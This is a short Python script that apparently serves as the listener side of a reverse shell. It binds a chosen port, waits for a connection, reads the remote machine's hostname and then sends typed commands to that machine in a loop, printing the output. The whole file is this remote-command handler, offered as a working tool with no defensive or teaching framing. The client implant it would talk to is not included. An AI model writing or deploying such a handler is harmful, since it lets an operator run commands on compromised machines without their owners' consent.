import socket, os, sys
os.system("cls")
ver = "0.1"

class Color:

    header = '\033[95m'
    blue = '\033[94m'
    green = '\033[92m'
    yellow = '\033[93m'
    red = '\033[91m'
    end = '\033[0m'
    bold = '\033[1m'
    underline = '\033[4m'


important = Color.green +"[!] " + Color.end;
warning = Color.red + "[!] " + Color.end;
process = Color.yellow + "[*] " + Color.end;


def main():
    
    greetings()
    

    socketCreate() 
    socketBind()
    socketAccept()


def dataSend(con, data):
    print(process + "Sending data [" + data + "] \n")
    return con.sendall(data.encode('utf-8'))


def dataRecv(con, size):
    data = con.recv(size).decode('utf-8')
    #print("[!] Recieved data [" + data + "]")
    return data



def menu():
    conn.settimeout(2)
    while 1:
        try:
            cmd = input(Color.green + Color.underline + str(addr[0]) + "@" + str(hostname) + ">" + Color.end + " ")
          
            if cmd == "quit":
                print(Color.red + "Terminating connection ... " + Color.end)
                conn.close ()
                s.close ( )
                sys.exit()
                  
            command = dataSend(conn, cmd) 
            result = dataRecv(conn, 16834)
              
            if (result != hostname):
                print(result)
        except socket.timeout as msg:
            print( Color.red + "[!!] Timed out, aborting listen" + Color.end)




def greetings():
    print(Color.bold + "Starting ... \nVersion " + ver + Color.end + "\n\n")


def socketCreate():
    try:
        global host 
        global port 
        global s
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host = ""
        
        port = input("Type the port for listening: ")
        
        if port == "":
            socketCreate()
            
        port = int(port)

    except socket.error as msg:
         print(warning + "Socket creation error: " + str(msg[0]))
         
def socketBind():
    try:

        print(process + 'Binding socket at port %s' %(port))

        s.bind((host,port))
        print(host)
        s.listen(1)
        
    except socket.error as msg:
        print (warning + "Socket binding error: " + str(msg[0]))
        print (process + "Retrying...")
        socketBind()


def socketAccept(): 
    global conn
    global addr
    global hostname
    
    try:
        conn, addr = s.accept()
        print( important + "Session opened at %s:%s" % (addr[0],addr[1]))
        print("\n")

        hostname = dataRecv(conn, 4096)
        menu()
          
    except socket.error as msg:
        print(warning + "Socket Accepting error:" + str(msg[0]))

        



                



    

main()
